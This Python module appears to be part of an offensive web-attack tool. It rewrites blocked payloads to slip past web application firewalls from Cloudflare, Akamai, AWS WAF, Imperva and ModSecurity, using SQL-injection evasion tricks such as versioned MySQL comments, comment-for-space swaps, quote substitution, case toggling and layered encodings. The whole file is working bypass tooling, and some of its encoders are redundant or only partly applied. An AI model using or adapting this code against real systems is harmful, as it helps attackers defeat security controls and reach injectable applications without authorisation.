"""Payload mutation helpers for the Adaptive Payload Engine.

Extracted from titan/ai/adaptive.py. Given a blocked payload and
optionally a WAF name, these produce mutation variants (WAF-specific,
generic, encoding, case-toggle). Pure - they call only sibling
mutation helpers, never engine state.
"""

from __future__ import annotations


class MutationMixin:
    """WAF-specific, generic, and encoding payload mutations."""

    def mutate_blocked_payloads(
        self,
        blocked_payloads: list[str],
        attack_type: str,
        target_url: str,
        waf: str | None = None,
    ) -> list[str]:
        """Mutate payloads that were blocked to bypass WAF."""
        mutated = []

        for payload in blocked_payloads:
            # Apply WAF-specific mutations
            if waf:
                mutated.extend(self._waf_specific_mutations(payload, waf))

            # Apply generic mutations
            mutated.extend(self._generic_mutations(payload))

            # Apply encoding mutations
            mutated.extend(self._encoding_mutations(payload))

        # Deduplicate
        seen = set()
        result = []
        for p in mutated:
            if p not in seen and p not in blocked_payloads:
                seen.add(p)
                result.append(p)

        return result[:30]

    def _waf_specific_mutations(self, payload: str, waf: str) -> list[str]:
        """Apply WAF-specific mutations."""
        mutations = []

        if waf == "cloudflare":
            mutations.extend([
                payload.replace(" ", "/**/"),
                payload.replace(" ", "%09"),
                payload.replace(" ", "%0a"),
                payload.replace("'", "/*!50000'*/"),
                payload.replace("UNION", "/*!50000UNION*/"),
                payload.replace("SELECT", "/*!50000SELECT*/"),
                payload.replace("--", "/**/--"),
            ])

        elif waf == "akamai":
            mutations.extend([
                payload.replace(" ", "/**/"),
                payload.replace("'", "''"),
                payload.replace("UNION", "UNION/**/"),
                payload.replace("SELECT", "SELECT/**/"),
            ])

        elif waf == "aws_waf":
            mutations.extend([
                payload.replace(" ", "%20"),
                payload.replace("'", "%27"),
                payload.replace('"', "%22"),
                payload.replace("UNION", "%55NION"),
                payload.replace("SELECT", "%53ELECT"),
            ])

        elif waf == "imperva":
            mutations.extend([
                payload.replace(" ", "/**/"),
                payload.replace("'", "%27"),
                payload.replace("UNION", "UNION/**/"),
            ])

        elif waf == "mod_security":
            mutations.extend([
                payload.replace(" ", "/**/"),
                payload.replace("'", "''"),
                payload.replace("UNION", "/*!UNION*/"),
                payload.replace("SELECT", "/*!SELECT*/"),
            ])

        return mutations

    def _generic_mutations(self, payload: str) -> list[str]:
        """Apply generic mutations."""
        mutations = []

        # Case variations
        mutations.append(payload.upper())
        mutations.append(payload.lower())
        mutations.append(self._toggle_case(payload))

        # Whitespace variations
        mutations.append(payload.replace(" ", "\t"))
        mutations.append(payload.replace(" ", "\n"))
        mutations.append(payload.replace(" ", "\r"))
        mutations.append(payload.replace(" ", "/**/"))

        # Quote variations
        mutations.append(payload.replace("'", "''"))
        mutations.append(payload.replace("'", "`"))
        mutations.append(payload.replace("'", "%27"))
        mutations.append(payload.replace('"', "%22"))

        # Comment variations
        mutations.append(payload.replace("--", "#"))
        mutations.append(payload.replace("--", "/**/"))
        mutations.append(payload.replace("/*", "/**/"))

        return mutations

    def _encoding_mutations(self, payload: str) -> list[str]:
        """Apply encoding mutations."""
        mutations = []

        # URL encoding
        from urllib.parse import quote
        mutations.append(quote(payload, safe=""))
        mutations.append(quote(quote(payload, safe="")))

        # Double URL encoding
        mutations.append(quote(quote(payload, safe="")))

        # Unicode encoding
        mutations.append("".join(f"%u{ord(c):04x}" if ord(c) > 127 else c for c in payload))

        # HTML entity encoding
        mutations.append("".join(f"&#x{ord(c):x};" if ord(c) > 127 else c for c in payload))

        # Hex encoding
        mutations.append(payload.encode().hex())

        # Base64
        import base64
        mutations.append(base64.b64encode(payload.encode()).decode())

        return mutations

    def _toggle_case(self, payload: str) -> str:
        """Toggle case of each character."""
        return "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(payload))

    # ── Stats ───────────────────────────────────────────────────────────

